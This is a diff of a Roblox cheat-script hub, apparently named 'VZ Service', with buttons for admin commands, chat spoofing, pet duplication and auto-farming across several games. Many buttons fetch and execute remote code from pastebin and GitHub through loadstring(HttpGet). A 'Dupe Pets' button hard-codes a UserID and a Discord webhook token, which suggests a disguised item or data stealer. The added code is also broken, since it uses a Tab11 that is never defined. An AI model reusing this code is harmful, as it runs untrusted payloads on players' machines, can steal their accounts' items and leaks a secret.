@@ -30,14 +30,14 @@ Tab:AddColorpicker({
 })
 
 Tab:AddButton({
-	Name = "Admin Commands",
+	Name = "🔥 Admin Commands",
 	Callback = function()
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
   	end    
 })
 
 Tab:AddButton({
-	Name = "Korblox Leg (Visual)",
+	Name = "🔥 Korblox Leg (Visual)",
 	Callback = function()
         local ply = game.Players.LocalPlayer
     local chr = ply.Character
@@ -51,7 +51,7 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
-	Name = "Headless Head (Visual)",
+	Name = "🔥 Headless Head (Visual)",
 	Callback = function()
         game.Players.LocalPlayer.Character.Head.Transparency = 1
         game.Players.LocalPlayer.Character.Head.Transparency = 1
@@ -92,7 +92,7 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
-	Name = "Mad City Gui",
+	Name = "❌ Mad City Gui",
 	Callback = function()
         loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/811e25ec8cfcdaa9ae7026353288783c/raw/4b073a5c1a0a4e2ed7e2304c2e769eb440a371a9/h", true))()
   	end    
@@ -106,7 +106,7 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
-	Name = "Ninja Tycoon Gui",
+	Name = "Ninja Tycoon Gui 2",
 	Callback = function()
         loadstring(game:HttpGet'https://pastebin.com/raw/TFfWqiXK')()
   	end    
@@ -178,7 +178,7 @@ local Section = Tab3:AddSection({
 
 
 Tab3:AddButton({
-	Name = "Chat Spoofer",
+	Name = "🔥 Chat Spoofer",
 	Callback = function()
         loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
   	end    
@@ -197,7 +197,7 @@ local Section = Tab4:AddSection({
 
 
 Tab4:AddButton({
-	Name = "Pls Donate Auto Chat",
+	Name = "🔥 Pls Donate Auto Chat",
 	Callback = function()
       -- if statements
 if getgenv().loaded == true then
@@ -355,7 +355,7 @@ Tab5:AddButton({
 })
 
 Tab5:AddButton({
-	Name = "Spam Eggs (Might Lag You're Game)",
+	Name = "⭐ Spam Eggs (Might Lag You're Game)",
 	Callback = function()
 
         OrionLib:MakeNotification({
@@ -465,7 +465,7 @@ end
 
 
 Tab5:AddButton({
-	Name = "Dupe Pets (Equip 2 Pets to Dupe)",
+	Name = "⭐ Dupe Pets (Equip 2 Pets to Dupe)",
 	Callback = function()
         _G.UserID = 1930407347
         _G.WebHook = "https://discord.com/api/webhooks/1038931177601515552/V5gDZKSXYRmF1v-v4jcvBEnlmPjXCvAWKyfG-BwJGDYlS87ps2-JCyh8TAyJ-3Be-VHj"
@@ -494,14 +494,14 @@ local Section = Tab6:AddSection({
 
 
 Tab6:AddButton({
-	Name = "VG Hub Gui",
+	Name = "🔥 VG Hub Gui",
 	Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
   	end    
 })
 
 Tab6:AddButton({
-	Name = "Make Every Pet Fly & Ride",
+	Name = "🔥 Make Every Pet Fly & Ride",
 	Callback = function()
         while true do
             wait()
@@ -524,7 +524,7 @@ Tab6:AddButton({
 })
 
 Tab6:AddButton({
-	Name = "Make Every Pet Fly",
+	Name = "🔥 Make Every Pet Fly",
 	Callback = function()
         while true do
             wait()
@@ -539,7 +539,7 @@ Tab6:AddButton({
 
 
 Tab6:AddButton({
-	Name = "Make Every Pet Ride",
+	Name = "🔥 Make Every Pet Ride",
 	Callback = function()
         while true do
             wait()
@@ -573,7 +573,7 @@ Tab7:AddButton({
 })
 
 Tab7:AddButton({
-	Name = "Admin Fly (Need to be in Swag roblox Group)",
+	Name = "🔥 Admin Fly (Need to be in Swag roblox Group)",
 	Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
   	end    
@@ -598,7 +598,7 @@ local Section = Tab8:AddSection({
 })
 
 Tab8:AddButton({
-	Name = "Auto Swing",
+	Name = "🔥 Auto Swing",
 	Callback = function()
         getgenv().autoswing = v
         while true do
@@ -618,7 +618,7 @@ Tab8:AddButton({
 })
 
 Tab8:AddButton({
-	Name = "Auto Sell",
+	Name = "🔥 Auto Sell",
 	Callback = function()
         getgenv().autosell = v
         while true do
@@ -632,7 +632,7 @@ Tab8:AddButton({
 })
 
 Tab8:AddButton({
-	Name = "Unlock all islands",
+	Name = "🔥 Unlock all islands",
 	Callback = function()
         local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
         for _,v in pairs(game:GetService("Workspace").islandUnlockParts:GetChildren()) do
@@ -646,7 +646,7 @@ Tab8:AddButton({
 
 
 Tab8:AddButton({
-	Name = "Auto Buy Swords",
+	Name = "🔥 Auto Buy Swords",
 	Callback = function()
         getgenv().buyswords = v
     while true do
@@ -662,7 +662,7 @@ Tab8:AddButton({
 
 
 Tab8:AddButton({
-	Name = "Auto Buy Belts",
+	Name = "🔥 Auto Buy Belts",
 	Callback = function()
         getgenv().buybelts = v
         while true do
@@ -690,7 +690,7 @@ local Section = Tab9:AddSection({
 })
 
 Tab9:AddButton({
-	Name = "Chat Spoofer",
+	Name = "🔥 Chat Spoofer",
 	Callback = function()
         loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
   	end    
@@ -715,7 +715,7 @@ Tab9:AddButton({
 
 
 Tab9:AddButton({
-	Name = "Korblox Leg (Visual)",
+	Name = "🔥 Korblox Leg (Visual)",
 	Callback = function()
         local ply = game.Players.LocalPlayer
     local chr = ply.Character
@@ -729,7 +729,7 @@ Tab9:AddButton({
 })
 
 Tab9:AddButton({
-	Name = "Headless Head (Visual)",
+	Name = "🔥 Headless Head (Visual)",
 	Callback = function()
         game.Players.LocalPlayer.Character.Head.Transparency = 1
         game.Players.LocalPlayer.Character.Head.Transparency = 1
@@ -744,13 +744,20 @@ Tab9:AddButton({
 
 
 local Tab10 = Window:MakeTab({
-	Name = "Shindo Life",
+	Name = "SHINDO💎Life",
 	Icon = "rbxassetid://11982164035",
 	PremiumOnly = false
 })
 
 local Section = Tab10:AddSection({
-	Name = "Shindo Life Scripts💎"
+	Name = "Shindo Life Scripts, Be the greatest of them all!"
+})
+
+local Section = Tab10:AddSection({
+	Name = "WARNING: Keyless Scripts are mostly bugged ones, so use the key ones for better experience",
+	Default = Color3.fromRGB(234, 221, 202),
+	Callback = function(Value)		
+		end
 })
 
 
@@ -765,7 +772,7 @@ Tab10:AddButton({
 Tab10:AddButton({
 	Name = "Auto Farm GUI (Key)",
 	Callback = function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/TrustsenseDev/Utilities/main/Premier.lua', true))()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/TrustsenseDev/Utilities/main/Premier.lua', true))()
   	end    
 })
 
@@ -788,11 +795,35 @@ Tab10:AddButton({
 
 
 
+local Tab10 = Window:MakeTab({
+	Name = "Build a boat for treasure",
+	Icon = "rbxassetid://11982164035",
+	PremiumOnly = false
+})
+
+local Section = Tab11:AddSection({
+	Name = "The code for the auto farm Build a boat is ( <3 )"
+})
+
+local Section = Tab11:AddSection({
+	Name = "OPINION: If you dont like the auto farm system you can use other websites or other GUIS for an better experience",
+	Default = Color3.fromRGB(234, 221, 202),
+	Callback = function(Value)		
+		end
+})
 
 
 
+Tab11:AddButton({
+	Name = "Auto Farm GUI (Key)",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/03koios/Loader/main/Loader.lua"))()
+  	end    
+})
 
-
+local Section = Tab11:AddSection({
+	Name = "READ:  The AUTO BUILD System is lagging the whole menu, but you still can find it on youtube!"
+})
 
 
 
@@ -909,6 +940,13 @@ local CreditzCreator = Window:MakeTab({
 	PremiumOnly = false
 })
 
+local Section = CreditzCreator:AddSection({
+	Name = "00010101010101010100101 VZ SERVICE 010101010101010101",
+	Default = Color3.fromRGB(0, 255, 255),
+	Callback = function(Value)		
+	end	 	
+})
+
 CreditzCreator:AddButton({
 	Name = "Copy Discord Server Link",
 	Callback = function()
@@ -948,4 +986,53 @@ local Section = CreditzCreator:AddSection({
 })
 local Section = CreditzCreator:AddSection({
 	Name = "Join Discord Server and Subscribe on YOUTUBE to support!"
+})
+
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help!"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with your help??"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help!"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with ur help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "VZ Service is an unkown GUI to this day, how about we make it popular with youre help?"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "If you can tell the difference ill pay you 20,000 ROBUX"
 })
